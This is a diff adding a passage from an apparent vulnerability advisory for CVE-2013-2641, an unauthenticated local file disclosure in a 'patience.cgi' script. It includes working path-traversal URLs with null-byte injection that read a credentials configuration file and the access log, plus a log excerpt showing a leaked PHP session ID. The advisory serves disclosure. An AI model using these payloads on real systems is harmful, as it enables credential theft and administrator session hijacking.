@@ -1,0 +1,18 @@
+Unauthenticated local file disclosure (CVE-2013-2641)
+As an example, an unauthenticated user can download the configuration file
+containing the salted hash of the administrator password as well as clear text
+passwords e.g. for FTP backup storage or Active Directory authentication:
+
+https://www.example.com/cgi-bin/patience.cgi?id=../../persist/config/shared.conf%00
+
+Furthermore the Apache access log can be retrieved. As PHP session IDs are
+passed via the URL rather than via Cookies, these can be found in this log
+file and effectively used to impersonate administrator users:
+
+https://<host>/cgi-bin/patience.cgi?id=../../log/ui_access_log%00
+
+An excerpt from the log file shows that it contains PHP session ID information
+(parameter "STYLE").
+<host> - - [21/Feb/2013:17:02:17 +0000] "POST /index.php?c=dashboard HTTP/1.1" 200 139
+"https://www.example.com/index.php?section=configuration&c=configuration&STYLE=8514d0a3c2fc9f8d47e2988076778153"
+"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:19.0) Gecko/20100101 Firefox/19.0"
